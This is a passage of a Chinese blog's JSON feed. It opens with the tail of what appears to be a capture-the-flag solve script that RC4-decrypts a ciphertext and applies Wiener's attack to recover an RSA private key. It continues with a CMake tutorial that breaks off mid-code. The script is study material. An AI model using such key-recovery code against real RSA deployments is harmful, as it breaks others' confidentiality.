operator\">=</span> pub_key<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>n <span class=\"token operator\">=</span> pub_key<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\"># 恢复 c</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>v <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>data_xor_iv <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>sbox <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>j <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>x <span class=\"token operator\">=</span> y <span class=\"token operator\">=</span> k <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>key <span class=\"token operator\">=</span> <span class=\"token string\">'911dcd09ad021d68780e3efed1aa8549'</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    sbox<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    j <span class=\"token operator\">=</span> j <span class=\"token operator\">+</span> sbox<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">255</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    sbox<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> sbox<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> sbox<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> sbox<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token keyword\">for</span> idx <span class=\"token keyword\">in</span> v<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    x <span class=\"token operator\">=</span> x <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">255</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    y <span class=\"token operator\">=</span> y <span class=\"token operator\">+</span> sbox<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">255</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    sbox<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> sbox<span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> sbox<span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> sbox<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    k <span class=\"token operator\">=</span> sbox<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>sbox<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> sbox<span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    c<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>idx <span class=\"token operator\">^</span> k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token comment\"># 维纳攻击</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>d <span class=\"token operator\">=</span> wienerAttack<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>libnum<span class=\"token punctuation\">.</span>n2s<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/03/26/CMake/",
            "url": "https://3cly.github.io/2023/03/26/CMake/",
            "title": "=CMake=",
            "date_published": "2023-03-26T06:38:21.000Z",
            "content_html": "<h1 id=\"cmake-01-basic\"><a class=\"markdownIt-Anchor\" href=\"#cmake-01-basic\">#</a> cmake 01-basic</h1>\n<h2 id=\"什么是cmake\"><a class=\"markdownIt-Anchor\" href=\"#什么是cmake\">#</a> 什么是 cmake</h2>\n<img data-src=\"\\images\\image-20230320003127778.png\" alt=\"image-20230320003127778\" style=\"zoom: 67%;\">\n<p>之前在 linux 虚拟机上安装各种工具或者编译文件时候常用到 cmake, 那么什么是 cmake 呢？</p>\n<p>CMake 是一个跨平台的安装（编译）工具，可以用简单的语句来描述所有平台的安装 (编译过程)。他能够输出各种各样的 makefile 或者 project 文件，CMake 的组态档取名为 CMakeLists.txt。也就是在 CMakeLists.txt 这个文件中写 cmake 代码。接下来就系统的学习一下 cmake 的语法</p>\n<h2 id=\"一hello-cmake\"><a class=\"markdownIt-Anchor\" href=\"#一hello-cmake\">#</a> (一) hello-cmake</h2>\n<h3 id=\"maincpp\"><a class=\"markdownIt-Anchor\" href=\"#maincpp\">#</a> main.cpp</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   std<span class=\"token operator\">::</span>cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Hello CMake!\"</span> <span class=\"token operator\">&lt;&lt;</span> std<span class=\"token operator\">::</span>endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"cmakeliststxt\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#设置 CMake 最小版本</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">project</span> <span class=\"token punctuation\">(</span>hello_cmake<span class=\"token punctuation\">)</span> <span class=\"token comment\">#设置工程名</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>hello_cmake main.cpp<span class=\"token punctuation\">)</span> <span class=\"token comment\">#生成可执行文件</span></pre></td></tr></table></figure><p><strong>生成与工程同名的二进制文件的办法</strong></p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">2.6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">project</span> <span class=\"token punctuation\">(</span>hello_cmake<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">PROJECT_NAME</span><span class=\"token punctuation\">&#125;</span> main.cpp<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>project (hello_cmake) 函数执行时会生成一个变量，是 PROJECT_NAME，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mrow><mi>P</mi><mi>R</mi><mi>O</mi><mi>J</mi><mi>E</mi><mi>C</mi><msub><mi>T</mi><mi>N</mi></msub><mi>A</mi><mi>M</mi><mi>E</mi></mrow><mtext>表示</mtext><mi>P</mi><mi>R</mi><mi>O</mi><mi>J</mi><mi>E</mi><mi>C</mi><msub><mi>T</mi><mi>N</mi></msub><mi>A</mi><mi>M</mi><mi>E</mi><mtext>变量的值为</mtext><mi>h</mi><mi>e</mi><mi>l</mi><mi>l</mi><msub><mi>o</mi><mi>c</mi></msub><mi>m</mi><mi>a</mi><mi>k</mi><mi>e</mi><mo separator=\"true\">,</mo><mtext>所以把</mtext></mrow><annotation encoding=\"application/x-tex\">{PROJECT_NAME}表示PROJECT_NAME变量的值为hello_cmake,所以把</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span></span><span class=\"mord cjk_fallback\">表</span><span class=\"mord cjk_fallback\">示</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord cjk_fallback\">变</span><span class=\"mord cjk_fallback\">量</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">值</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\"><span class=\"mord mathnormal\">o</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">c</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mord mathnormal\">e</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">所</span><span class=\"mord cjk_fallback\">以</span><span class=\"mord cjk_fallback\">把</span></span></span></span> {PROJECT_NAME} 用在 add_executable () 里可以生成可执行文件名字叫 hello_cmake</p>\n<h3 id=\"构建-编译和运行\"><a class=\"markdownIt-Anchor\" href=\"#构建-编译和运行\">#</a> 构建、编译和运行</h3>\n<p>构建有外部构建和内部构建两种，推荐使用外部构建，我们可以创建一个可以位于文件系统上任何位置的构建文件夹。 所有临时构建和目标文件都位于此目录中，以保持源代码树的整洁。</p>\n<p>拿本例子来说：</p>\n<p>运行下述代码，新建 build 构建文件夹，并运行 cmake 命令</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mkdir</span> build  新建build构建文件夹</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">cd</span> build/</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>cmake <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>这时其实可以直接make</pre></td></tr></table></figure><p>构建系统是需要指定 CMakeLists.txt 所在路径，此时在 build 目录下，所以用  <code>..</code>  表示 CMakeLists.txt 在上一级目录。</p>\n<p>此时在 build 目录下会生成 Makefile 文件，然后调用编译器来实际编译和链接项目：</p>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>cmake --build .</pre></td></tr></table></figure><p><code>--build</code>  指定编译生成的文件存放目录，其中就包括可执行文件， <code>.</code>  表示存放到当前目录</p>\n<p><img data-src=\"P:%5CHexo-Blog%5Csource%5Cimages%5Cimage-20230320210319645.png\" alt=\"image-20230320210319645\"></p>\n<p>同时如果点开 build 文件夹就可以看到，build 文件夹下生成了许多二进制文件，如果要从头开始重新创建 cmake 环境，只需删除构建目录 build，然后重新运行 cmake。 所以外部构建非常方便</p>\n<h2 id=\"二hello-headers\"><a class=\"markdownIt-Anchor\" href=\"#二hello-headers\">#</a> (二) hello-headers</h2>\n<h3 id=\"文件树\"><a class=\"markdownIt-Anchor\" href=\"#文件树\">#</a> 文件树</h3>\n<pre><code class=\"language-tree\">├── CMakeLists.txt\n├── include\n│   └── Hello.h\n└── src\n    ├── Hello.cpp\n    └── main.cpp\n</code></pre>\n<h3 id=\"cmakeliststxt-2\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt-2\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#最低 CMake 版本</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">project</span> <span class=\"token punctuation\">(</span>hello_headers<span class=\"token punctuation\">)</span><span class=\"token comment\"># 工程名</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">set</span><span class=\"token punctuation\">(</span><span class=\"token property\">SOURCES</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    src/Hello.cpp</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    src/main.cpp</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token comment\">#创建一个变量，名字叫 SOURCE。它包含了所有的 cpp 文件。</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>hello_headers <span class=\"token punctuation\">$&#123;</span><span class=\"token property\">SOURCES</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#用所有的源文件生成一个可执行文件，因为这里定义了 SOURCE 变量，所以就不需要罗列 cpp 文件了</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#等价于命令：     add_executable (hello_headers src/Hello.cpp src/main.cpp)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">target_include_directories</span><span class=\"token punctuation\">(</span>hello_headers</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">PROJECT_SOURCE_DIR</span><span class=\"token punctuation\">&#125;</span>/include</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token comment\">#设置这个可执行文件 hello_headers 需要包含的库的路径</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#PROJECT_SOURCE_DIR 指工程顶层目录</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#PROJECT_Binary_DIR 指编译目录</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#PRIVATE 指定了库的范围</span></pre></td></tr></table></figure><blockquote>\n<ul>\n<li>PRIVATE - 目录被添加到目标（库）的包含路径中。</li>\n<li>INTERFACE - 目录没有被添加到目标（库）的包含路径中，而是链接了这个库的其他目标（库或者可执行程序）包含路径中</li>\n<li>PUBLIC - 目录既被添加到目标（库）的包含路径中，同时添加到了链接了这个库的其他目标（库或者可执行程序）的包含路径中</li>\n</ul>\n<p>也就是说，根据库是否包含这个路径，以及调用了这个库的其他目标是否包含这个路径，可以分为三种 scope。</p>\n</blockquote>\n<h3 id=\"cmake中的常用的变量一些目录\"><a class=\"markdownIt-Anchor\" href=\"#cmake中的常用的变量一些目录\">#</a> CMake 中的常用的变量 (一些目录)</h3>\n<p>CMake 语法指定了许多变量，可用于在项目或源代码树中找到有用的目录。 其中一些包括：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">Variable</th>\n<th style=\"text-align:left\">Info</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">CMAKE_SOURCE_DIR</td>\n<td style=\"text-align:left\">根源代码目录，工程顶层目录。暂认为就是 PROJECT_SOURCE_DIR</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CMAKE_CURRENT_SOURCE_DIR</td>\n<td style=\"text-align:left\">当前处理的 CMakeLists.txt 所在的路径</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">PROJECT_SOURCE_DIR</td>\n<td style=\"text-align:left\">工程顶层目录</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CMAKE_BINARY_DIR</td>\n<td style=\"text-align:left\">运行 cmake 的目录。外部构建时就是 build 目录</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CMAKE_CURRENT_BINARY_DIR</td>\n<td style=\"text-align:left\">The build directory you are currently in. 当前所在 build 目录</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">PROJECT_BINARY_DIR</td>\n<td style=\"text-align:left\">暂认为就是 CMAKE_BINARY_DIR</td>\n</tr>\n</tbody>\n</table>\n<p>想体会一下，可以在 CMakeLists 中，利用 message（）命令输出一下这些变量。</p>\n<p>另外，这些变量不仅可以在 CMakeLists 中使用，同样可以在源代码.cpp 中使用。</p>\n<h3 id=\"源文件变量不建议这样做\"><a class=\"markdownIt-Anchor\" href=\"#源文件变量不建议这样做\">#</a> 源文件变量 (不建议这样做)</h3>\n<p>回到代码的部分，这里创建了一个包含多个源文件的变量 SOURCES (不建议这样做，可能会导致 glob 命令在添加新的源文件后不会显示正确的结果)</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">set</span><span class=\"token punctuation\">(</span><span class=\"token property\">SOURCES</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    src/Hello.cpp</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    src/main.cpp</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">PROJECT_NAME</span><span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">$&#123;</span><span class=\"token property\">SOURCES</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"包含头文件\"><a class=\"markdownIt-Anchor\" href=\"#包含头文件\">#</a> 包含头文件</h3>\n<p>当您有其他需要包含的文件夹（文件夹里有头文件）时，可以使用以下命令使编译器知道它们： target_include_directories（）。 编译此目标时，这将使用 - I 标志将这些目录添加到编译器中，例如 -I / 目录 / 路径</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">target_include_directories</span><span class=\"token punctuation\">(</span>target</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">PROJECT_SOURCE_DIR</span><span class=\"token punctuation\">&#125;</span>/include</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>PRIVATE  标识符指定包含的范围。 这对库很重要。</p>\n</blockquote>\n<p><strong>对于公共的头文件，最好在 include 文件夹下建立子目录。</strong></p>\n<p><strong>传递给函数 target_include_directories () 的目录，应该是所有包含目录的根目录，然后在这个根目录下建立不同的文件夹，分别写头文件。</strong></p>\n<p><strong>这样使用的时候，不需要写 ${PROJECT_SOURCE_DIR}/include，而是直接选择对应的文件夹里对应头文件。下面是例子： <code>#include &quot;static/Hello.h&quot;</code>  而不是 <code>#include &quot;Hello.h&quot;</code>  使用此方法意味着在项目中使用多个库时，头文件名冲突的可能性较小。</strong></p>\n<h2 id=\"三static-library\"><a class=\"markdownIt-Anchor\" href=\"#三static-library\">#</a> （三）Static Library</h2>\n<h3 id=\"cmakeliststxt-3\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt-3\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">project</span><span class=\"token punctuation\">(</span>hello_library<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># Create a library</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#库的源文件 Hello.cpp 生成静态库 hello_library</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">add_library</span><span class=\"token punctuation\">(</span>hello_library <span class=\"token namespace\">STATIC</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    src/Hello.cpp</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">target_include_directories</span><span class=\"token punctuation\">(</span>hello_library</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token namespace\">PUBLIC</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">PROJECT_SOURCE_DIR</span><span class=\"token punctuation\">&#125;</span>/include</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># target_include_directories 为一个目标（可能是一个库 library 也可能是可执行文件）添加头文件路径。</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># Create an executable</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># Add an executable with the above sources</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#指定用哪个源文件生成可执行文件</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>hello_binary </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    src/main.cpp</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#链接可执行文件和静态库</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token 